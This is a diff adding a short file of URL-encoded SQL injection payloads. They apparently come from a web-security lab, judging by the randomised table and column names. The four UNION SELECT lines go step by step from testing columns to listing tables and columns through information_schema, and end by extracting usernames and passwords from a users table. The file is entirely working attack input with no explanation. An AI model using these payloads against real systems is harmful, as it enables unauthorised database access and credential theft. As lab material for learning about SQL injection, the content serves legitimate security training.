@@ -1,0 +1,4 @@
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_idttfe'--
+'+UNION+SELECT+username_hwivwv,+password_xrdqyg+FROM+users_idttfe--
